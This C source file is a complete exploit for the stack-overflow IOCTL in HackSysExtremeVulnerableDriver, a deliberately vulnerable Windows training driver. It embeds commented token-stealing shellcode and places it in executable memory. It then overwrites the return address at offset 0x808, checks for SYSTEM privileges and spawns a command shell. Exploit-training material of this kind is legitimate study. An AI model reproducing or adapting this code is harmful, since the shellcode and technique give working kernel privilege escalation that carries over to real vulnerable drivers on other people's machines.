#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>

#include "../hevd.h"

#define DRIVER_PATH "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_HEVD_STACK_OVERFLOW 0x222003


/**
 * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
 * Compiled with cemu - https://github.com/hugsy/cemu.git
 */
#define SC_SZ 80
const char SC[SC_SZ] = ""
        "\x50"                                                      // push rax
        "\x53"                                                      // push rbx
        "\x51"                                                      // push rcx
        "\x65\x48\x8b\x04\x25\x88\x01\x00\x00"                      // mov rax, gs:0x188
        "\x48\x8b\x80\xb8\x00\x00\x00"                              // mov rax, [rax+0xb8]
        "\x48\x89\xc3"                                              // mov rbx, rax
        "\x48\x8b\x9b\xe8\x02\x00\x00"                              // mov rbx, [rbx+0x2e8]
        "\x48\x81\xeb\xe8\x02\x00\x00"                              // sub rbx, 0x2e8
        "\x48\x8b\x8b\xe0\x02\x00\x00"                              // mov rcx, [rbx+0x2e0]
        "\x48\x83\xf9\x04"                                          // cmp rcx, 4
        "\x75\xe5"                                                  // jnz -0x19
        "\x48\x8b\x8b\x48\x03\x00\x00"                              // mov rcx, [rbx + 0x348]
        "\x80\xe1\xf0"                                              // and cl, 0xf0
        "\x48\x89\x88\x48\x03\x00\x00"                              // mov [rax + 0x348], rcx
        "\x59"                                                      // pop rcx
        "\x5b"                                                      // pop rbx
        "\x58"                                                      // pop rax
        "\x58\x58\x58\x58\x58"                                      // pop rax; pop rax; pop rax; pop rax; pop rax;
        "\x48\x31\xc0"                                              // xor rax, rax
        "\xc3"                                                      // ret
        "";


BOOL HevdIoControl()
{
        HANDLE hDevice = INVALID_HANDLE_VALUE;
        BOOL bResult = FALSE;
        DWORD junk = 0;
        LPVOID lpInBuffer;
        DWORD nInBufferSize;
        LPVOID lpOutBuffer = NULL;
        DWORD nOutBufferSize;
        DWORD lpBytesReturned = 0;

        info("Getting handle for device '%s' with code %#x\n", DRIVER_PATH, IOCTL_HEVD_STACK_OVERFLOW);

        hDevice = CreateFileA(DRIVER_PATH,
                              GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL,
                              OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,
                              NULL);
        if (hDevice == INVALID_HANDLE_VALUE){
                perr("CreateFileA failed");
                return FALSE;
        }

        ok("Got device %#lx\n", hDevice);

        info("Preparing payload\n");
        lpInBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!lpInBuffer){
                perr("VirtualAlloc failed");
                goto closedev_loc;
        }

        uint64_t offset = 0x808;
        ok("Payload allocated -> %p\n", lpInBuffer);
        ZeroMemory(lpInBuffer, 0x1000);
        CopyMemory(lpInBuffer, (LPVOID)SC, SC_SZ);
        RtlFillMemory((uint8_t*)lpInBuffer+SC_SZ, offset-SC_SZ, '\xcc');
        ok("Shellcode copied to %p\n", lpInBuffer);


        uint64_t *ptr = (uint64_t*) (uint8_t*)(lpInBuffer + offset);
        info("Overwriting at %p\n", ptr);
        *ptr = (uint64_t)lpInBuffer;
        nInBufferSize = offset + 8;

        info("Sending payload...\n");
        bResult = DeviceIoControl(hDevice,
                                  IOCTL_HEVD_STACK_OVERFLOW,
                                  lpInBuffer,
                                  nInBufferSize,
                                  NULL,
                                  0,
                                  &lpBytesReturned,
                                  (LPOVERLAPPED) NULL);
        if (bResult==FALSE){
                perr("DeviceIoControl failed");
        }

closedev_loc:
        info("Closing device %#lx\n", hDevice);
        CloseHandle(hDevice);

        return bResult;
}


int main(int argc, char** argv, char** envp)
{
        info("Starting exploit for StackOverflow...\n");

        if (HevdIoControl()==TRUE){
                info("Checking if %s is SYSTEM\n", argv[0]);
                if (CheckIsSystem()==TRUE){
                        ok("Success\n");
                        PopupCmd();
                } else {
                        warn("Not SYSTEM\n");
                }
        }
        return 0;
}
